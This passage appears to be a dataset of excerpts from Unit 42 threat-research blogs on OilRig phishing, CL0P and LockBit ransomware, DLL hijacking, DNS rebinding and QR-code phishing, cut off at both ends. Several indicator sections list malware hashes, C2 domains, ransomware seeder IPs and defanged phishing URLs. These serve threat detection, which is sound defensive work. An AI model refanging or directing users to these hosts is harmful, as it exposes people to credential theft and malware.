archives attached, as seen in Figure 1. Note that \"Important\" is misspelled in the sample as shown below.\nFigure 1 Delivery email that contains two Zip archives that contain the malicious delivery documents\nThe message body in the attack email contains an image that is hosted on a remote server. As shown in Figure 2, hovering over the image shows that the URL link is to an image hosted at \"www.cdnakamaiplanet[.]com\" which we have reason to believe is an adversary owned domain. It is likely that the image was embedded to track if the recipient opened the email or not.\nFigure 2 URL associated with image included in delivery email\nAnother interesting facet of this attack is that the email addresses in the \"To\" and \"From\" fields are from addresses from the same domain. Our initial assumption was that the email address in the \"From\" field was likely spoofed. Additional analysis of the email headers revealed that it did not contain a list of external email servers used to deliver the message as expected from a spoofed email; instead, we discovered the following string within the email headers:\nClient=OWA;Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04;\nThis string in the header suggests that the OilRig actor is likely to have used the targeted organization's Outlook Web Access (OWA) to send the phishing email using Firefox 36.\nUsing information from our research in theStriking Oilblog, we know the OilRig group has conducted credential harvesting campaigns specifically by emulating OWA login sites. Based on that research and this observation, we postulate that the OilRig group gathered credentials to a legitimate user's OWA account and logged into the user's account to send phishing attacks to other individuals within the same, targeted organization. Also, Firefox 36 was released in February 2015; since this email was sent August 2017, we believe it suggests the actors are using an outdated version of Firefox to log into the target organization's OWA.", "source": "Palo"}, {"title": "Conclusion", "content": "The OilRig group continues to target organizations in the Middle East, in this instance targeting the government of the United Arab Emirates. They continue to use the ISMAgent Trojan as the final payload in their attacks, this time in conjunction with a custom injector Trojan to assist with delivery and execution. The injector Trojan was obfuscated using a known crypter and used state-machines as an anti-analysis technique to complicate its process to inject the payload into another process. The use of crypters and anti-analysis techniques suggests that the threat actors are increasing their efforts to evade security products to successfully compromise its targets.\nAs our research continues to expand into the OilRig group, we are continuously discovering new infrastructure which directly overlaps with previously used infrastructure. With the addition of the reuse of tools, similar attack protocols, as well as consistent victimology, we have strong confidence that the original OilRig attack campaign is indeed a single, unique, and previously unknown threat group that will hereby be referred to as the OilRig group.\nPalo Alto Networks customers are protected from ISMInjector, ISMAgent and ThreeDollars by the following:\nAll ISMInjector, ISMAgent and ThreeDollars samples are marked with a malicious verdict in WildFire \nAutoFocus customers can track these malware families via:ISMInjectorISMAgentThreeDollars \nISMInjector \nISMAgent \nThreeDollars", "source": "Palo"}, {"title": "Indicators", "content": "ThreeDollars SHA256\n119c64a8b35bd626b3ea5f630d533b2e0e7852a4c59694125ff08f9965b5f9cc\nISMInjector SHA256\n33c187cfd9e3b68c3089c27ac64a519ccc951ccb3c74d75179c520f54f11f647\nISMAgent SHA256\n74f61b6ff0eb58d76f4cacfb1504cb6b72684d0d0980d42cba364c6ef28223a8\nISMAgent C2\ncdnmsnupdate[.]com\nRelated CVE-2017-0199 SHA256\n66358a295b8b551819e053f2ee072678605a5f2419c1c486e454ab476c40ed6a\nRelated CVE-2017-0199 Domains\nmsoffice-cdn[.]com\noffice365-management[.]com", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers introduce a machine learning model that predicts the maliciousness of .NET samples based on specific structures in the file, by analyzing a .NET wiper named DoubleZero. We identify the challenges of detecting this threat through PE structural analysis and conclude by examining the cues picked up by the machine learning model to detect this sample.\nWhile wipers are not necessarily new, the recent discovery of several new wipers associated with the ongoing Russia-Ukraine cyber activity has driven renewed public interest in understanding how to identify and defend against their use.\nPalo Alto Networks customers receive protections from .NET malwares with Cortex XDR or the Next-Generation Firewall with cloud-delivered security services, including WildFire and Advanced Threat Prevention.", "source": "Palo"}, {"title": "Conclusion", "content": "Researchers have been using PE file structure to detect variants within malware families for years, as they often share similarities in their file structure. Despite the .NET framework being well known, it can still be challenging to detect files using this strategy. Some of the most useful attributes for identifying PE malware files don't offer many clues for identifying .NET malware.\nWe have highlighted the fundamental difference between .NET and PE samples to help identify where those clues could be hiding. In doing so, we illustrated that machine learning feature engineering can be improved by correctly parsing out the .NET specific data structure.\nWe also showed that imported libraries, unmanaged API calls and unencrypted strings are the most useful features for detecting .NET malware. While a recent wiper called DoubleZero was analyzed as an example, the features that are important for detecting .NET can be generalized, and this feature can be broadly useful for future research efforts.\nPalo Alto Networks customers receive protections from .NET malware withCortex XDRor theNext-Generation Firewallwithcloud-delivered security servicesincludingWildFireandAdvanced Threat Prevention.", "source": "Palo"}, {"title": "Introduction", "content": "Palo Alto NetworksTraps Advanced Endpoint Protectionrecently prevented recent attacks that we believe are part of a campaign linked toDustySky. DustySky is a campaign which others haveattributedto the Gaza Cybergang group, a group that targetsgovernment interestsin the region.\nThis report shares our researchers' analysis of the attack and Remote Access Tool (RAT). We also discovered during our research that the RAT Server used by this attacker is itself vulnerable to remote attack, a double-edged sword for these attackers.", "source": "Palo"}, {"title": "IOC", "content": "Palo Alto Networks customers are protected from Downeks and Quasar used in this attack:\nWildFire properly classifies these Downeks and Quasar samples as malicious. \nTraps detects and blocks malicious behavior exhibited by new, unknown Quasar samples. \nC2 servers associated with this activity are blocked through Threat Prevention DNS signatures. \nAutoFocus customers can monitor this activity using theDowneksandQuasarRATtags.\nA list of Indicators of Compromise can be found in Appendix C - IoCs.", "source": "Palo"}, {"title": "IOC", "content": "downloadtesting.comgameoolines.comonlinesoft.spacenewphoneapp.comgamestoplay.bidsmartsftp.pwgalaxysupdates.comgalaxy-s.comdatasamsung.comprogsupdate.comtopgamse.combandtester.comspeedbind.comukgames.techwallanews.publicvm.comwallanews.sytes.netnoredirecto.redirectme.netdynamicipaddress.linkpc.netdownloadlog.linkpc.nethavan.qhigh.comkolabdown.sytes.netrotter2.publicvm.comftpserverit.otzo.comwebfile.myq-see.comdownloadmyhost.zapto.orghelp2014.linkpc.netsafara.sytes.netexportball.servegame.orgviewnet.better-than.tvdown.downloadoneyoutube.co.vunetstreamag.publicvm.comhostgatero.ddns.netsubsidiaryohio.linkpc.nethelpyoume.linkpc.net", "source": "Palo"}, {"title": "Introduction", "content": "Generally speaking, criminal groups use two methods for widespread distribution of malware. The most common method is malicious spam (malspam). This is a fairly direct mechanism, usually through an email attachment or a link in the message to the malware. However, malspam requires some sort of action by the user to be successful (for example, opening an attached file).\nThe other method for widespread malware distribution is anexploit kit(EK). EKs are designed to work behind the scenes while a potential victim is browsing the web. An EK does not require any additional action by the end user.\nEKs are a sophisticated delivery method. Malware distribution through an EK involves other components in the chain of events that lead to a malware infection.This blog is the first of a two-part post intended to provide clearer understanding of Angler EK. Here we will focus on EK activity targeting computers running Microsoft Windows. Windows remains the prevalent operating system world-wide, and it offers the largest amount of potential victims for criminals using an EK.", "source": "Palo"}, {"title": "Conclusion", "content": "This blog post covered definitions necessary to understanding EK traffic. We discussed how EKs are rented by criminals as a service, available in the underground market. We also reviewed the chain of events within an EK and additional steps seen from an EK within a campaign. Malvertising is one of many types of campaigns seen with EK traffic.\nHow can people defend their systems against EK activity? Use a layered defense. First make sure your operating system and applications are patched and up-to-date. EKs take advantage of outdated browser-based applications to infect vulnerable Windows hosts.\nNetwork detection is the second component of layered defense. Solutions like Palo Alto Networks Next-Generation Security Platform can help security teams detect constantly changing indicators of EK activity.\nFinally, a layered defense should also include endpoint protection as a third component. Palo Alto NetworksTrapscan help protect an organization's assets against malicious executables, data files or network-based exploits before any malicious activity can successfully run.\nPart two of this blog post will cover one of the most advanced, effective, and popular EKs in the criminal market: Angler EK.", "source": "Palo"}, {"title": "Introduction", "content": "The CL0P ransomware group recently began using torrents to distribute victim data after a successful campaign stealing data from thousands of companies. We'll cover the reason for this shift in methodology and what this means for visibility to the outside world.\nCL0P has been one of the ransomware groups most actively posting data about their victims on leak sites tracked by Unit 42 (second only to LockBit in 2023). Unit 42 consultants have recently observed CL0P in about 10 incident response cases.\nCL0P's torrent seed infrastructure provides a unique opportunity for us to peer into the direct workings of a notorious ransomware group and provide insights into their trade craft. By analyzing the existing torrent seed infrastructure that hosts the stolen data, we can get a better view into what the implications of this change are.\nTo protect the victims of this attack, and to have a little fun with one of our favorite fandoms, we've swapped the organizations' names for those of Pok\u00e9mon.\nPalo Alto Networks customers receive protection from CL0P ransomware and other malware throughCortex XDR. Palo Alto Networks customers receive protections from and mitigations for therecent MOVEit vulnerabilitiesin the following ways:\nCortex XDR and XSIAM agents help protect against post-exploitation activities associated with the MOVEit vulnerabilities using Behavioral Threat Protection, Anti-Webshell Protection and multiple additional security modules. \nCortex Xpansecustomers can identify external facing instances of the application through the \"MOVEit Transfer\" attack surface rule. \nOrganizations can engage theUnit 42 Incident Responseteam for specific assistance with this threat and others.", "source": "Palo"}, {"title": "Conclusion", "content": "By tracking and analyzing these types of shifts in leak site methodology, it gives us a unique insight into what a threat actor's mindset could be. By understanding the problem they face and how they are trying to solve it, it provides us with an opportunity for further analysis and research.\nIn this case, the result of this research is a handful of hosting servers out of Russia that hold enormous amounts of stolen victim data. We can expect much more to come in the following weeks.\nSeed boxes are always worth keeping an eye on. When the adversary's mind is focused elsewhere, it's a ripe environment for mistakes that lead to leaving us vital clues.\nAs for their trade craft, we know these threat actors are likely leveraging FTP to transfer the stolen files to the seed boxes. We also know that general visibility of SSH access shuts off immediately prior to the FTP services going live. This could mean multiple things, but top of mind is that they are likely prestaging the stolen data on the servers for quite some time before they make the announcement of the magnet link.\nLikewise, the distribution of victim data across the seed boxes does not align with their announcement schedule. This would add weight to the theory that the data has persisted on the box for a while prior to the torrent's creation. This could potentially be a technique they use to avoid seed tracking by having different victims announced at the same time yet seeded from different boxes.\nBefore I sign off, I want to provide some additional observations of the collected data as it stands on Aug. 30, 15 days after this activity began.\nThe total number of original seeders is five.\n81.19.135[.]21 (20 observed victims) \n81.19.135[.]25 (5 observed victims) \n81.19.135[.]31 (6 observed victims) \n95.215.0[.]76 (9 observed victims) \n92.118.36[.]111 (1 observed victim)\nThe total number of unobserved but likely seeders is two.\n81.19.135[.]11 \n95.215.1[.]221\nThe total number of magnet links (each a victim): 192\nThe total number of successful 100% peering logs: 146\nThe total number of peers I connected with: 115\nThe top five peering clients for seeders are as follows:\nqBittorrent 4.5.4(9) \nTransmission 3.00(7) \nqBittorrent 4.4.1(4) \nTransmission 2.9.3(4) \n\u00b5Torrent 3.6.0(4)\nFigure 21 shows the distribution of peers, which is fairly global.\nWhile I was not able to obtain all the file meta data before identifying a 100% seed and disconnecting, I did collect stats on what I observed.\nIn total, I received file data of just 41 of the victims (less than one-third of what I observed) totaling over 1.1 TB of data. The highest total file size I observed for any one victim was 127 GB with the low end being 2.8 MB and an average of 31 GB per victim.\nThere are many more victims to be released, and CL0P has remained relatively consistent in their release of their data, making good on all their threats. Additionally, some torrents for \"well-known Pok\u00e9mon\" (in this analogy) weremuchmore popular than others. Companies need to be aware that even if they do not pay the ransom, their data is a hot commodity for numerous reasons. None of those reasons are likely to be in their best interest.\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "Dynamic-link library (DLL) hijacking is one of the oldest techniques that both threat actors and offensive security professionals continue to use today. DLL hijacking is popular because it grants threat actors a stealthy way to run malware that can be very effective at evading detection. At its core, DLL hijacking tricks an operating system into running a malicious binary instead of a legitimate DLL.\nThis article explains how threat actors use DLL hijacking in malware attacks, and it should help readers by providing:\nTheoretical background necessary to understand DLL hijacking \nExplanations that demystify some of the concepts around this technique \nCommon variations seen in the wild \nReal-world examples from both advanced persistent threat (APT) and cybercrime threat actors\nThis article also provides ideas for how to better detect DLL hijacking, and we share best practices on how to reduce the risk of attack.\nPalo Alto Networks customers are better protected from the threats discussed in this article through ourNext-Generation Firewall, as well asAdvanced WildFire,DNS Security, andAdvanced URL Filtering.Cortex XDRandXSIAMdetect known and novel DLL hijacking attacks. ThePrisma CloudDefender agent can assist in identifying malware that uses DLL hijacking techniques. If you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "This article covers DLL hijacking, providing the technical background needed to understand how threat actors weaponize it, along with an explanation of popular variations in its implementation.\nIn addition, we provide examples that demonstrate how various threat actors \u2013 both APT nation-state and cybercrime groups \u2013 rely on this technique to achieve stealth, persistence and privilege escalation in their operations.\nLastly, we discuss possible approaches for detecting and mitigating DLL hijacking in enterprise environments.", "source": "Palo"}, {"title": "Introduction", "content": "Web-based consoles are widely adopted by management software and smart devices to provide interactive data visualization and user-friendly configuration. This is gaining momentum as enterprises' computer systems become more complex and more modern internet of things (IoT) devices are used at home. These web applications are usually located in internal environments or private networks protected by firewalls. Therefore, they usually have a high trust level for visitors. They typically assume all visitors are authorized and thus expose sensitive information or provide administrator privileges without strong application-level protection.\nAlthough the web services in private networks are supposed to be isolated from the internet and the same-origin policy prevents arbitrary websites from interacting with internal servers, hackers can still take advantage of web-based consoles to exploit internal networks by abusing the domain name system (DNS) through a technique called DNS rebinding. This technique can expose the attack surfaces of internal web applications to malicious websites once they launch on victims' browsers.\nIn this blog, we present the mechanism and severity of the DNS rebinding attack with penetration examples. After that, we introduce the mainstream mitigations against this attack and their limitations.\nPalo Alto Networks has launched a detector to capture DNS rebinding attacks from our DNS Security and passive DNS data. Our system provides scalable detection for various DNS rebinding payloads and reduces the false discovery rate by 85.09% compared to the traditional IP filtering solution. It ingests the DNS data in real time to identify penetration activities as soon as possible.\nPalo Alto Networks Next-Generation Firewallcustomers withDNS Security,URL Filtering, andThreat Preventionsecurity subscriptions are protected against DNS rebinding attacks.", "source": "Palo"}, {"title": "Conclusion", "content": "The DNS rebinding attack can compromise victims' browsers as traffic tunnels to exploit private services. With this technique, attackers can steal confidential information and send forged requests to victims' servers. Browsers, resolvers and web applications have applied various protection strategies to defend against it. However, there are advanced exploits that can bypass traditional defenses. In addition, it's harder to enforce complete protection as the internal network environment becomes more complex.\nAt Palo Alto Networks, we have launched a DNS rebinding detection system to protect our customers. It can effectively identify various implementations of DNS rebinding that leverage multiple types of DNS records and present different resolution behaviors. The system's filtering module can identify legitimate usage of internal IP resolution to prevent false blocking. After capturing potential penetration activities, our system will release the attacking hostname with the command and control category toPalo Alto Networks Next-Generation Firewallsecurity subscriptions in real time.", "source": "Palo"}, {"title": "Introduction", "content": "Instead of creating phishing pages from scratch, more and more cybercriminals are now abusing legitimate software-as-a-service (SaaS) platforms, including various website builders or form builders, to host their phishing pages. Since these URLs are hosted on legitimate domains, they can be especially difficult for many phishing detection engines to detect. Furthermore, these platforms typically requirelittle to no coding experience, significantly lowering the barrier to entry for creating and launching phishing attacks.\nFrom the beginning of 2020 to June 2022, Palo Alto Networks analyzed the URLs detected by ourAdvanced URL Filteringservice, and discovered that the number of phishing URLs hosted on legitimate SaaS platforms has continued to increase at an alarming rate. In fact, from June 2021-June 2022, the rate of newly detected phishing URLs hosted on legitimate SaaS platforms has increased over 1100%.\nThe Palo Alto Networks Advanced URL Filtering uses deep learning to analyze the content of each webpage at the URL level instead of the domain level. Customers with an Advanced URL Filtering subscription therefore receive protections from these platform-abuse phishing attacks.", "source": "Palo"}, {"title": "Introduction", "content": "Today, more organizations are adopting existing SaaS tools for tasks like handling file storage, building websites, and more importantly, enabling collaboration within and outside of the organization. For example, many website builders allow users to easily create websites without having to write any code themselves, and form builders allow users to easily create and share surveys, registration forms, etc. Recently, we've seen that cybercriminals have begun to abuse these SaaS platforms for their own nefarious uses. In early 2022, we noticed an uptick in phishing URLs hosted on legitimate SaaS platforms, and we decided to further investigate this trend.", "source": "Palo"}, {"title": "Conclusion", "content": "As seen in the case studies shown above, just because a URL is hosted on a seemingly legitimate domain or platform, doesn't mean that the URL itself is trustworthy. More phishing URLs are being hosted on legitimate SaaS platforms, making these phishing pages both easier for attackers to create and harder for phishing detection engines to detect.\nSince the Palo Alto NetworksAdvanced URL Filteringservice analyzes web content on a URL level (using machine-learning models that study the actual content of the page), Palo Alto Networks customers who subscribe to Advanced URL Filtering receive protections from these types of phishing attacks, as well as from other web-based threats.\nFor end users, it is crucial to take caution when inputting one's credentials into any online type of platform. Furthermore, users should be wary of any suspicious emails that use time-sensitive language to prompt a user to take some sort of urgent action.\nWhen in doubt, users should manually navigate to the relevant login page directly in their browser (for example, by typinglogin.microsoftonline.comin the navigation bar), instead of clicking any links contained in a potentially deceptive email.", "source": "Palo"}, {"title": "Introduction", "content": "LockBit 2.0 is ransomware as a service (RaaS) that first emerged in June 2021 as an upgrade to its predecessor LockBit (aka ABCD Ransomware), which was first observed in September 2019.\nSince its inception, the LockBit 2.0 RaaS attracted affiliates via recruitment campaigns in underground forums, and thus became particularly prolific during the third quarter of calendar year 2021. The LockBit 2.0 operators claimed to have the fastest encryption software of any active ransomware strain as of June 2021, claiming accordingly that this added to its effectiveness and ability to disrupt the ransomware landscape.\nWhile several top-tier RaaS affiliate programs, such as Babuk,DarkSideandREvil(aka Sodinokibi) disappeared from the underground in 2021, LockBit 2.0 continued to operate and gradually became one of the most active ransomware operations. While Conti was recognized as being the most prolific ransomware deployed in 2021 per our2022 Unit 42 Ransomware Threat Report, LockBit 2.0 is the most impactful and widely deployed ransomware variant we have observed in all ransomware breaches during the first quarter of 2022, considering both leak site data and data from cases handled by Unit 42 incident responders.\nAccording to data analysis of ransomware groups' dark web leak sites, LockBit 2.0 was the most impactful RaaS for five consecutive months. As of May 25, LockBit 2.0 accounted for 46% of all ransomware-related breach events for 2022. And the LockBit 2.0 RaaS leak site has the most significant number of published victims, with over 850 in total.\nAdditionally, LockBit 2.0 has affected many companies globally, with top victims based in the U.S., Italy and Germany. Its most highly targeted industry verticals include professional services, construction, wholesale and retail, and manufacturing.\nPalo Alto Networks customers receive protections against LockBit 2.0 attacks from Cortex XDR, as well as from the WildFire cloud-delivered security subscription for the Next-Generation Firewall. (Please see theConclusionsection for more detail.)", "source": "Palo"}, {"title": "Conclusion", "content": "LockBit 2.0 and its evolution over time is a perfect example to illustrate the persistence, increasing complexity and impact brought by the ransomware landscape as a whole. With claims of this RaaS offering the fastest encryption on the ransomware market, coupled with the fact that it has been delivered in high volume by experienced affiliates, this RaaS poses a significant threat. LockBit's continuation with operations and its next iteration coming up on the horizon means that organizations and their security teams need to stay vigilant in the ever-evolving threat landscape.\nPalo Alto Networks detects and prevents LockBit 2.0 ransomware in the following ways:\nWildFire: All known samples are identified as malware. \nCortex XDR:Identifies indicators associated with LockBit 2.0.Anti-Ransomware Module to detect LockBit 2.0 encryption behaviors on Windows.Local Analysis detection for LockBit 2.0 binaries on Windows. \nIdentifies indicators associated with LockBit 2.0. \nAnti-Ransomware Module to detect LockBit 2.0 encryption behaviors on Windows. \nLocal Analysis detection for LockBit 2.0 binaries on Windows. \nNext-Generation Firewalls: DNS Signatures detect the known C2 domains, which are also categorized as malware inAdvancedURL Filtering.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Appendix", "content": "In August 2021, a Russian blogger published a 22-minute interview with an alleged representative of the group behind LockBit 2.0 called \"LockBitSupp\" on a YouTube channel called \"Russian-language open source intelligence (OSINT).\" The same Russian blogger previously published interviews with a representative of the group behind the REvil ransomware-as-a-service (RaaS), hackers and security experts.\nSome key takeaways from the claims made in the interview were:\nThe LockBit 2.0 threat actor claimed the group's RaaS was unlikely to be rebranded since the team allegedly was a business that was honest with their customers \u2013 suggesting a supposed contrast between LockBit 2.0 and Avaddon, DarkSide and REvil affiliates. \nThe LockBit 2.0 ransomware disregarded keyboard layout, but it allegedly would not run on a host where the system language was set to any of the languages spoken in the Commonwealth of Independent States region. \nThe group did not devise attacks on companies of their choice; they simply worked with initial access to any corporate network they obtained elsewhere, since this was more profitable and saved time. The team selected targets for ransomware attacks based on the company's finances - the bigger, the better. The location also did not matter. However, team members allegedly did not attack healthcare facilities, social services, educational institutions and charitable organizations or any other organization that \"contributed to the survival of the human race.\" [Note that Unit 42 case data does include indications that threat actors using LockBit 2.0 have targeted healthcare organizations at times.] \nThe threat actor claimed that the largest number of victims who paid ransom were company representatives who did not care about creating backup copies and did not protect their sensitive data. According to the threat actor's claims, companies that violated regulations about collecting and handling customer or user personal information were among those eager to pay. The threat actor claimed that there generally were only a few companies who refused to pay ransom on principle, while most of the victims evaluated profit and loss to decide whether or not to pay a ransom. \nLockBit 2.0 operators allegedly almost always offered discounts to their victims since the goal was to streamline attacks. \nThe threat actor claimed that the COVID-19 pandemic facilitated ransomware attacks significantly, saying it was easy to compromise home computers of employees who work remotely and use them as a springboard to access other networked systems. \nCompanies in Europe and the U.S. were hit with ransomware much more often than companies based in other countries allegedly because of high profit and insurance and not because of language barriers. \nRansomware operators usually recruit negotiators, who coerce victims to pay ransom, since professional penetration testers allegedly lack the time for chatter.", "source": "Palo"}, {"title": "Introduction", "content": "Since late 2024, Unit 42 researchers have observed attackers using several new tactics in phishing documents containing QR codes. One tactic involves attackers concealing the final phishing destination using legitimate websites' redirection mechanisms. Another tactic involves attackers adopting Cloudflare Turnstile for user verification, enabling them to evade security crawlers and convincingly redirect targets to a login page. We found that some of these phishing sites are specifically targeting the credentials of particular victims, suggesting pre-attack reconnaissance.\nIn traditional phishing attacks, attackers use obvious links or buttons in phishing documents. Attackers have begun embedding phishing URLs into QR codes, a technique known as QR code phishing orquishing. This strategy entices recipients to scan the codes with their smartphones, which can lead them to unknowingly access phishing sites and expose their credentials to theft.\nOur telemetry shows these phishing attacks have been widespread across the U.S. and Europe. The attacks are also impacting various industries, including the medical, automotive, education, energy and financial sectors.\nPalo Alto Networks customers are better protected from the threats discussed above through the following products:\nCloud-delivered security servicesfor the Next-Generation Firewall includingAdvanced WildFire, \u200b\u200bAdvanced URL FilteringandAdvanced DNS Security\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "Phishing attacks and social engineering tactics remain significant threats to users, and it is evident that these tactics have evolved over time.\nOur research highlights several key observations of attacker's activities:\nUsing QR codes in phishing documents to disguise malicious URLs \nExploitating open redirects to complicate attack analysis \nIncorporating human verification within redirects\nThese evolving tactics challenge both security detection mechanisms and user awareness. Attackers' increasing use of QR codes in phishing highlights the need for improved security awareness training and technical solutions that can detect and block these threats.\nPalo Alto Networks Protection and Mitigation\nPalo Alto Networks customers are better protected from the threats discussed above through the following products:\nTheAdvanced WildFiremachine-learning models and analysis techniques have been reviewed and updated in light of the IoCs shared in this research. \n\u200b\u200bAdvanced URL FilteringandAdvanced DNS Securityidentify known domains and URLs associated with this activity as malicious.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42) \nUK: +44.20.3743.3660 \nEurope and Middle East: +31.20.299.3130 \nAsia: +65.6983.8730 \nJapan: +81.50.1790.0200 \nAustralia: +61.2.4062.7950 \nIndia: 00080005045107\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Indicators", "content": "PDFs:\nb6130b45131035bec8d9b0304e934f2db0ee092ccaa709c3c2e8dd93770527bb \ne2cdd7eb0ea24c22d1e3dfea557a5a47dfdcd7c6b00b05bd5d099e0c8633ac25 \nfa38f31ed09774cfd2627bff376c27c44611b842b96f3215b0a491805d525a40 \n0209e93d568da3cd33f7af9e8733dd6eb56b3957b19622126f5115f36c2433dd \n6963820a6dadba2779a4b3999c5fde88faf8cf2dfa55d032b307217d9a80b77c \na4d40396bc437933a7f097e3ba997c91c82a5f516a719f6181ca4d51fa85a7aa \n1c3be2037b2a7b36311ef8fbcaa416ecb250dc20f5881570e8373e6e7f8237b1 \n8ea80304722e4285987b66dd8c74853b8a1474f585d7e24dc7616be4265d0d82 \ncbc5c6edb34ca898ca55f166ec64b23b057f9d8e8859c6fe9c9065bb42991f5b \n46897a4edb500df17e32ccee8a3134e3a15db387dd0492d8e110200d8cb57b60 \n3f2a3cc1216bfc6d1aa6d1b75150350da86a3a8c9c5b014c4b5f7ca62935c88c \ne682612a533382ddc188f547b37d93fd3f2de8ac7d5fd5f76eb92a22849109aa \n6a0c8d59d5d0b2bd44d81a3f3e20bcd6c515ca6bd30c3bf090bccc4049276276 \n6472293c24554bf52772a9f8543fe7ae973f1d5b4795ccc14940beeddcba118e \n9fe76bad7fa4f45ef49e720dde442f31f4c1847c7322ec09c09c5dd851f4de38 \n56d3e1daddd87a2454084a4687d6c245b3a3b2f2010d705d2b1983c0e87a5509 \n1bd8cace9e338eacdd9e41b55c594404483e1a1860d1946f612ecd21a6a7e5e5 \n3d66c093763eef0aa1b7c31242516d8d56e8fbe178f0915063045a6f85e61399 \n389ba4f794b66abe4fde0ede57450abb63ba1a3cd43940925762f206b03e1bea \n0e03f873f1fb44e2d9f8ba29c80158f23735bb2ef819feb99f5623e933d752e9 \n0d0d4cd198de3a8b5af74fbebfc4c657609570157f8f961499433d0d5f748e7c \n8c744eadec25b92de4ada45cdbc5e4c3507195127b2ed2f8450a7435b50b1f25 \n1737819220920abfa1d2201c0986df84b6570cbbc8d1aa96245151ed95c5992d \nb39855bd43bf45aff70da6fbd918789b17ff58d9c6764cc40db9aec4ecb79cc0 \nde158906c855857d435635ebfd1ac97a6715b0a890f536aafcf55c601585f751 \n07fec0a55956f66f20888e21f72a01c043b1c02a141c07988a6313099526c796 \n891abde147f30c6dfd791f7f2f7cb081f5474f4f1392f670ed55a6d6cd3f14a2 \nbdcfe5bf6eba8f59248739e1634bc43d50f5c55efbb7412c3b41e94f1a313771 \n5a5134dfed0d47d23073547ace40ff63be0b3138d835d6d5b0a5c5c3e1aa3d8e \n2f38a598fd49256691c707198c546ab84ddeafedbe72c60a9d03364263820d25 \n3e8a9620823039b938b662d6285330baca7f3930e790faeaf4e4b95dd3c02427 \nbc5e4ad38e324d742af28a2302bc6f59ec5f603f69b72bec7149b2cfbb50d980\nPhishingURLs:\nhxxps://ebjv[.]com[.]au/filesharer \nhxxps://a1892279[.]nhubiubuniunuion[.]workers[.]dev \nhxxps://docuusign[.]statementquo[.]com/ey8YO?e= \nhxxps://fa8ea903[.]nhubiubuniunuion[.]workers[.]dev/ \nhxxp://dhzyxo[.]promptexpression[.]com/?e= \nhxxps://docusignelectronic[.]courtappdirectory[.]com/6PkvL/?e= \nhxxps://storage[.]cloudcourtdoc[.]com/wsTtv?e= \nhxxps://fbl[.]5jbl2j[.]com/P6ThlTUUTfoKMgwqFKuQ/ \nhxxps://docdxsiga[.]goodbreadtrucklng[.]com/gbkrV/ \nhxxps://Docxxdoct[.]goodbreadtrucklng[.]com/U6bXM/ \nhxxps://wtcg[.]rolixanorn[.]ru/n7cLGYDs/ \nhxxps://dmcomunicacaovisual[.]com/m/?c3Y9bzM2NV8xX3NwJnJhbmQ9UjFKVU9YUT0mdWlkPVVTRVIwNjAxMjAyNVUwMzAxMDYzOQ==N0123N \nhxxps://advitya-heights[.]com/m/?c3Y9bzM2NV8xX25vbSZyYW5kPU9Ya3piRFU9JnVpZD1VU0VSMDYwMTIwMjVVMjUwMTA2NTA=N0123N \nhxxps://clases[.]pastorluiscastro[.]com/m/?c3Y9bzM2NV8xX25vbSZyYW5kPVVrcGhRMFE9JnVpZD1VU0VSMDYwMTIwMjVVMjUwMTA2NTA=N0123N \nhxxps://htbilisim[.]com/m/?c3Y9bzM2NV8xX3NwJnJhbmQ9V2tVNWFuWT0mdWlkPVVTRVIwNjAxMjAyNVUwMzAxMDYzOQ==N0123 \nhxxps://www[.]magneticosrmn[.]com/m/?c3Y9bzM2NV8xX3NwJnJhbmQ9T0hwWFUxZz0mdWlkPVVTRVIwNjAxMjAyNVUwMzAxMDYzOQ==N0123N \nhxxps://vk[.]hrewatecea[.]ru/0Jrsf/ \nhxxps://gracious-tranquility-production[.]up[.]railway[.]app/fa910c532fc9c990/eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9[.]eyJrZXkiOiJmYTkxMGM1MzJmYzljOTkwIiwiaWF0IjoxNzMzOTQ2NjQ0fQ[.]GDYykGf3tTA6K0GSiSvl01y_U0zveiKk9jmR_B3jTEw \nhxxps://web-ofisi[.]com[.]tr/yeni/T6epXbk4ck8zZNXyS5wyRzTbm43LOM1gR49#", "source": "Palo"}, {"title": "Introduction", "content": "Security professionals occasionally use Wireshark to review packet captures (pcaps) of malware-generated network traffic. To more efficiently review this type of activity, we suggest users customize their Wireshark installation.\nInour previous tutorial, we customized Wireshark's column display. This tutorial introduces display filter expressions useful to review pcaps of malicious network traffic from infected Windows hosts.\nThis blog is the second ina series of Wireshark tutorialsthat provide customization options helpful for investigating malicious network traffic. It was first published in January 2019 and has been updated for 2023.\nThe pcaps in this tutorial contain traffic generated by Windows-based malware. Palo Alto Networks customers receive protection from these threats throughCortex XDRand ourNext-Generation FirewallwithCloud-Delivered Security Servicesthat includeWildFireandAdvanced Threat Prevention.", "source": "Palo"}, {"title": "Conclusion", "content": "Wireshark display filter expressions are necessary to understand the contents of a pcap. When combined with an optimized column display, effective filters can immensely help security professionals investigate suspicious network activity.\nOurnext tutorial in this seriesreviews how to identify hosts and users when investigating suspicious network activity.\nPcaps used in this tutorial contain traffic generated by Windows-based malware. Palo Alto Networks customers receive protection from these threats throughCortex XDRand ourNext-Generation FirewallwithCloud-Delivered Security Servicesthat includeWildFire,Advanced Threat PreventionandAdvanced 